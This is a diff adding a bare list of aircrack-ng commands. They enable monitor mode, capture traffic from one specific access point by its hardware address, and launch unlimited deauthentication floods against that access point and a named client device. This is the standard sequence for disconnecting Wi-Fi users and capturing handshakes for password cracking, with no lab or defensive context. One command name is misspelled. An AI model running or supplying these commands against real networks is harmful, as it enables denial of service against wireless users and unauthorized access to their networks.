@@ -1,0 +1,11 @@
+sudo airmon-ng start wlan0mon
+
+sudo airdump-ng wlan0mon
+
+airodump-ng --help
+
+sudo airodump-ng --channel 2 -w networkme -bssid 6C:19:8F:BC:CD:9A wlan0mon
+
+sudo aireplay-ng -0 0 -a 6C:19:8F:BC:CD:9A wlan0mon
+
+sudo aireplay-ng -0 0 -a 6C:19:8F:BC:CD:9A -c 74:4A:A4:7E:08:B8 wlan0mon
